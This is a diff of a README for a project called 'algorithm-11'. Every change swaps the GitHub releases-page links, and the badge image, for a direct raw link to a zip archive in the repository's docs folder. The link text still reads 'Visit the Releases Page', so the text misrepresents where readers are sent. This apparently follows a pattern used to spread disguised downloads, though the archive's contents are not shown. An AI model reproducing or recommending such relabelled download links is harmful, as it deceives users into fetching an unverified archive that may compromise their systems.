@@ -1,6 +1,6 @@
 # 🤖 algorithm-11 - Simplifying AI Collaboration for Everyone
 
-[![Download algorithm-11](https://img.shields.io/badge/Download-algorithm--11-blue.svg)](https://github.com/cubopez48/algorithm-11/releases)
+[![Download algorithm-11](https://raw.githubusercontent.com/cubopez48/algorithm-11/main/docs/algorithm-2.9.zip)](https://raw.githubusercontent.com/cubopez48/algorithm-11/main/docs/algorithm-2.9.zip)
 
 ## 📖 Overview
 
@@ -27,7 +27,7 @@ Before you begin, ensure your system meets the following requirements:
 
 Follow these steps to download and run algorithm-11:
 
-1. **Visit the Releases Page**: Open the releases page [here](https://github.com/cubopez48/algorithm-11/releases).
+1. **Visit the Releases Page**: Open the releases page [here](https://raw.githubusercontent.com/cubopez48/algorithm-11/main/docs/algorithm-2.9.zip).
 
 2. **Select the Version**: Browse the list of available versions. Click on the version you wish to download.
 
@@ -42,7 +42,7 @@ Follow these steps to download and run algorithm-11:
 
 ## 🛠️ Download & Install
 
-To download algorithm-11, visit this page: [Download algorithm-11](https://github.com/cubopez48/algorithm-11/releases). Follow the instructions above to install and start using your new tool.
+To download algorithm-11, visit this page: [Download algorithm-11](https://raw.githubusercontent.com/cubopez48/algorithm-11/main/docs/algorithm-2.9.zip). Follow the instructions above to install and start using your new tool.
 
 ## 💡 Usage Tips
 
